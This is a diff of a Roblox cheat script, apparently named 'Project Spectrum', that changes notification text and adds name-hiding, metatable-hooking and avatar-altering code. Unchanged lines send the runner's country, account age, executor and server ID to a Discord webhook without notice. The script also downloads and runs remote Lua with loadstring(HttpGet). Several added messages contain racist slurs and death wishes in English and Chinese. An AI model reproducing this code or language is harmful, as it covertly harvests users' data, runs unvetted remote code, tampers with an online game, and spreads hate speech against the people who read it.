@@ -13,33 +13,33 @@ local data = {
             color = tonumber(322852),
             fields = {
                 {
-                    name = "Country:",
+                    name = "Country :",
                     value = "```" .. code .. "```",
                     inline = true
                 },
                 {
-                    name = "Age:",
+                    name = "Account Age :",
                     value = "```" .. player.AccountAge .. " Days```",
                     inline = true
                 },
                 {
-                    name = "Executor:",
+                    name = "Executor :",
                     value = "```" .. identifyexecutor() .. "```",
                     inline = true
                 },
                 {
-                    name = "Level:",
+                    name = "Level :",
                     value = "```" .. le .. "```",
                     inline = true
                 },
                 {
-                    name = "Job ID:",
+                    name = "Job ID :",
                     value = "```" .. tostring(game.JobId) .. "```",
                     inline = true
                 },
                 {
-                    name = "Status:",
-                    value = "``` Project Spectrum 9.0```",
+                    name = "User Status :",
+                    value = "``` Using Project Spectrum 8.0 [Special Edition] Now!!```",
                     inline = true
                 }
             }
@@ -56,17 +56,192 @@ local final = {Url = webhookUrl, Body = jsonData, Method = "POST", Headers = hea
 
 local success, response = pcall(request, final)
 if success then
-    print("Profile information sent to Discord.")
+    print("Hello")
 else
-    print("Failed to send profile information to Discord: " .. response)
+    print("Go Die Nigga" .. response)
 end
+
+local Config =
+{
+   ProtectedName = "Name Protect by\n Project Spectrum", --What the protected name should be called.
+   OtherPlayers = false, --If other players should also have protected names.
+   OtherPlayersTemplate = "NameProtect", --Template for other players protected name (ex: "NamedProtect" will turn into "NameProtect1" for first player and so on)
+   RenameTextBoxes = false, --If TextBoxes should be renamed. (could cause issues with admin guis/etc)
+   UseMetatableHook = true, --Use metatable hook to increase chance of filtering. (is not supported on wrappers like bleu)
+   UseAggressiveFiltering = false --Use aggressive property renaming filter. (renames a lot more but at the cost of lag)
+}
+
+local ProtectedNames = {}
+local Counter = 1
+if Config.OtherPlayers then
+   for I, V in pairs(game:GetService("Players"):GetPlayers()) do
+       ProtectedNames[V.Name] = Config.OtherPlayersTemplate .. tostring(Counter)
+       Counter = Counter + 1
+   end
+
+   game:GetService("Players").PlayerAdded:connect(function(Player)
+       ProtectedNames[Player.Name] = Config.OtherPlayersTemplate .. tostring(Counter)
+       Counter = Counter + 1
+   end)
+end
+
+local LPName = game:GetService("Players").LocalPlayer.Name
+local IsA = game.IsA
+
+local function FilterString(S)
+   local RS = S
+   if Config.OtherPlayers then
+       for I, V in pairs(ProtectedNames) do
+           RS = string.gsub(RS, I, V)
+       end
+   end
+   RS = string.gsub(RS, LPName, Config.ProtectedName)
+   return RS
+end
+
+for I, V in pairs(game:GetDescendants()) do
+   if Config.RenameTextBoxes then
+       if IsA(V, "TextLabel") or IsA(V, "TextButton") or IsA(V, "TextBox") then
+           V.Text = FilterString(V.Text)
+
+           if Config.UseAggressiveFiltering then
+               V:GetPropertyChangedSignal("Text"):connect(function()
+                   V.Text = FilterString(V.Text) 
+               end)
+           end
+       end
+   else
+       if IsA(V, "TextLabel") or IsA(V, "TextButton") then
+           V.Text = FilterString(V.Text)
+
+           if Config.UseAggressiveFiltering then
+               V:GetPropertyChangedSignal("Text"):connect(function()
+                   V.Text = FilterString(V.Text) 
+               end)
+           end
+       end
+   end
+end
+
+if Config.UseAggressiveFiltering then
+   game.DescendantAdded:connect(function(V)
+       if Config.RenameTextBoxes then
+           if IsA(V, "TextLabel") or IsA(V, "TextButton") or IsA(V, "TextBox") then
+               V:GetPropertyChangedSignal("Text"):connect(function()
+                   V.Text = FilterString(V.Text) 
+               end)
+           end
+       else
+           if IsA(V, "TextLabel") or IsA(V, "TextButton") then
+               V:GetPropertyChangedSignal("Text"):connect(function()
+                   V.Text = FilterString(V.Text) 
+               end)
+           end
+       end
+   end)
+end
+
+if Config.UseMetatableHook then
+   if not getrawmetatable then
+       error("GetRawMetaTable not found")
+   end
+
+   local NewCC = function(F)
+       if newcclosure then return newcclosure(F) end
+       return F
+   end
+
+   local SetRO = function(MT, V)
+       if setreadonly then return setreadonly(MT, V) end
+       if not V and make_writeable then return make_writeable(MT) end
+       if V and make_readonly then return make_readonly(MT) end
+       error("No setreadonly found")
+   end
+
+   local MT = getrawmetatable(game)
+   local OldNewIndex = MT.__newindex
+   SetRO(MT, false)
+
+   MT.__newindex = NewCC(function(T, K, V)
+       if Config.RenameTextBoxes then
+           if (IsA(T, "TextLabel") or IsA(T, "TextButton") or IsA(T, "TextBox")) and K == "Text" and type(V) == "string" then
+               return OldNewIndex(T, K, FilterString(V))
+           end
+       else
+           if (IsA(T, "TextLabel") or IsA(T, "TextButton")) and K == "Text" and type(V) == "string" then
+               return OldNewIndex(T, K, FilterString(V))
+           end
+       end
+
+       return OldNewIndex(T, K, V)
+   end)
+
+   SetRO(MT, true)
+end
+
+local hidehead = 100 -- Transparency If you don't like your head visible
+
+
+--load
+if not game['Loaded'] or not game:GetService('Players')['LocalPlayer'] then
+    game['Loaded']:Wait();
+    game:WaitForChild(game:GetService('Players'));
+    game:GetService('Players'):WaitForChild(game:GetService('Players').LocalPlayer.Name)
+end
+--end
+wait()
+repeat game:GetService("RunService").Stepped:Wait() until not game:GetService("Players").LocalPlayer.Character:FindFirstChild("ForceField")
+wait()
+
+game.Players.LocalPlayer.Character.Head.Transparency = hidehead
+game.Players.LocalPlayer.Character.Head.CanCollide = false
+game.Players.LocalPlayer.Character.Head.NeckRigAttachment.CFrame = CFrame.new(0, 0.6, 0, 0, 0, 0, 0, 0, 0, 0, 0, 0)
+
+for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
+    if v:IsA("Accessory") or v:IsA("Hat") then
+    end
+end
+
+--MAKE HEAD STUCK
+l = Instance.new("Attachment",game.Players.LocalPlayer.Character.Head)
+ll = Instance.new("Attachment",game.Players.LocalPlayer.Character.UpperTorso)
+o = Instance.new("AlignOrientation",l)
+o.Attachment0 = l
+o.Attachment1 = ll
+o.ReactionTorqueEnabled = true
+o.PrimaryAxisOnly = false
+o.MaxTorque = 9999999
+o.MaxAngularVelocity = math.huge
+o.Responsiveness = 200
+--end1
+
+
+wait(2)
+
+	local ply = game.Players.LocalPlayer
+		local chr = ply.Character
+		chr.RightLowerLeg.Transparency = "1"
+		chr.RightUpperLeg.MeshId = "http://www.roblox.com/asset/?id=902942096"
+		chr.RightUpperLeg.TextureID = "http://roblox.com/asset/?id=902843398"
+		chr.RightFoot.Transparency = "1"
+		
+wait(2)
+
+print("ThaiKidsMode = true")
 
 _G.HoHoLoaded = true
 notify = loadstring(game:HttpGet("https://raw.githubusercontent.com/acsu123/HOHO_H/main/Notification.lua"))()
-notify.New("Project Spectrum 9.0", 60)
-notify.New("by xZPUHigh & Version X Generation", 60)
+notify.New("Project Spectrum 8.0", 60)
+notify.New("by xZPUHigh & Special Edition", 60)
 
-function Muxus(text)
+wait(.1)
+print("Project Spectrum...")
+wait(0)
+    print("Founder/ ZPU {xZPUHigh}")
+        wait(0)
+    print("Last Updated 04/04/24")
+
+    function Muxus(text)
 		local Notification = require(game.ReplicatedStorage.Notification)
 		local notification = Notification.new(text)
 		notification.Duration = 5
@@ -81,19 +256,28 @@ function Muxus(text)
 		return false
 	end
 
-Muxus("<Color=Green>Pray For ZPU! (GOD OF THE WORLD)<Color=/>")
-Muxus("<Color=White>Script Loading...<Color=/>")
+Muxus("<Color=Green>Pray For ZPU! [I'm Allah :D]<Color=/>")
+wait(2)
+Muxus("<Color=White>Script Loading....<Color=/>")
+wait(3)
+wait(0.5)
+Muxus("<Color=Yellow>Идикчггерелтынахуй<Color=/>")
+wait(0.5)
+Muxus("<Color=Yellow>إِبْرَاهِيْمَ وَبَارِكْدٍ<Color=/>")
+wait(0.5)
+Muxus("<Color=Yellow>去死吧黑鬼去死吧操你<Color=/>")
+wait(0.5)
+Muxus("<Color=Yellow>Tôi yêu tất cả các bạn<Color=/>")
+wait(0.5)
+Muxus("<Color=Yellow>อย่าลืมกดติดตามช่อง xZPUHigh ด้วยนะครับทุกคน<Color=/>")
+Muxus("<Color=Red>Don't Forgot to Subscribe xZPUHigh<Color=/>")
+wait(5)
+Muxus("<Color=Green>Loading Success!!<Color=/>")
+wait(2)
+--[[
+	WARNING: This just BETA PROJECT! This script has not been verified by QC. Use at your own risk na kub!
+]]
 
-Muxus("<Color=Yellow>YED<Color=/>")
-wait(1)
-Muxus("<Color=Yellow>HEE<Color=/>")
-wait(1)
-Muxus("<Color=Yellow>GET<Color=/>")
-wait(1)
-Muxus("<Color=Yellow>MONEY<Color=/>")
-wait(1)
-Muxus("<Color=Red>ENJOY :D<Color=/>")
-wait(0.01)
 
 local Notif = {}
 
